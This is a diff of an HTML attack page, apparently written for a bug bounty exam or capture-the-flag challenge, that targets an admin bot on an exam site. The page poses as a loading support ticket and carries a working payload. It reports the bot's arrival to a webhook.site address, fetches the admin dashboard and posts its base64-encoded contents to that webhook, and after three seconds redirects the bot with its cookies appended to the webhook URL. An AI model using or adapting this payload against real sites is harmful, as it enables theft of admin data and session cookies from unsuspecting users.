@@ -1,33 +1,40 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Reviewing Support Ticket...</title>
+</head>
 <body>
     <script>
-        async function captureFlag() {
-            try {
-                // 1. Tell your webhook the hunt has started
-                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/HUNT_STARTED');
+        // 1. Notify your webhook that the bot is here
+        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/BOT_LANDED');
 
-                // 2. Try to grab the Admin Dashboard content
+        async function leakAdminData() {
+            try {
+                // 2. Try to fetch the dashboard where the flag usually lives
                 const response = await fetch('https://bugbounty-exam.hashacademy.co/admin/dashboard');
                 const html = await response.text();
 
-                // 3. Exfiltrate the HTML to your webhook
-                // We use a POST request here because HTML can be long
+                // 3. Send the HTML to your webhook via POST
                 await fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4', {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: html
+                    body: "DASHBOARD_LEAK:" + btoa(html)
                 });
-
-            } catch (err) {
-                // 4. If fetch fails (CORS), we use the "Redirect Leak"
-                // This forces the bot to go to the admin page, then we hope 
-                // a secondary XSS triggers. 
-                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
+            } catch (e) {
+                // 4. If fetch fails, the bot might be protected. 
+                // We redirect it to the message page to trigger any potential local flags.
+                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e37f99bee6d6b7c662cf3b";
             }
         }
 
-        captureFlag();
+        leakAdminData();
+
+        // 5. Fallback: After 3 seconds, just leak the cookies 
+        // by redirecting the bot's whole window
+        setTimeout(() => {
+            window.location.href = "https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/?cookie=" + btoa(document.cookie);
+        }, 3000);
     </script>
+    <p>Loading internal documentation, please wait...</p>
 </body>
 </html>
